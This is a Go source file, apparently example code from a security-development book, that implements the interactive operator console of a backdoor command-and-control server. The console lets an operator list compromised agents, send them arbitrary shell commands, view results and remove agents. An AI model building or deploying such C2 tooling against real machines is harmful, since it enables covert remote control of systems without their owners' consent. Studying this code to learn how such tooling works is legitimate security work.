/*

Copyright (c) 2018 sec.lu

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THEq
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/

package cli

import (
	"errors"
	"strings"

	"gopkg.in/abiosoft/ishell.v2"

	"sec-dev-in-action-src/backdoor/command-control/command-control-final/server/models"
)

func Shell() error {
	var err error
	shell := ishell.New()
	shell.Println("command & control manager")

	// list agent
	shell.AddCmd(&ishell.Cmd{
		Name: "list",
		Help: "list agent",
		Func: func(c *ishell.Context) {
			agents, err := ListAgents()
			if err == nil {
				DisplayAgent(agents)
			}
		},
	})

	// list command
	shell.AddCmd(&ishell.Cmd{
		Name: "cmd",
		Func: func(c *ishell.Context) {
			if len(c.Args) == 0 {
				c.Err(errors.New("missing agent_id"))
			} else {
				agentId := c.Args[0]
				cmds, err := ListCommand(agentId)
				if err == nil {
					DisplayCommand(cmds)
				}
			}
		},
		Help: "list command",
		Completer: func(args []string) []string {
			agentList := make([]string, 0)
			agents, err := ListAgents()
			if err == nil {
				for _, agent := range agents {
					agentList = append(agentList, agent.AgentId)
				}
			}

			return agentList
		},
	})

	// add command
	shell.AddCmd(&ishell.Cmd{
		Name: "run",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 2 {
				c.Err(errors.New("missing agent_id"))
			} else {
				agentId := c.Args[0]
				cmd := c.Args[1:]
				c := strings.Join(cmd, " ")
				_ = RunCommand(agentId, c)
			}
		},
		Help: "run agent_id command",
		Completer: func(args []string) []string {
			agentList := make([]string, 0)
			agents, err := ListAgents()
			if err == nil {
				for _, agent := range agents {
					agentList = append(agentList, agent.AgentId)
				}
			}
			return agentList
		},
	})

	// remove all agents
	shell.AddCmd(&ishell.Cmd{
		Name: "remove",
		Func: func(c *ishell.Context) {
			_ = models.RemoveAll()
		},
		Help: "remove all agent",
	})

	go ListCmdResult()

	shell.Run()

	return err
}
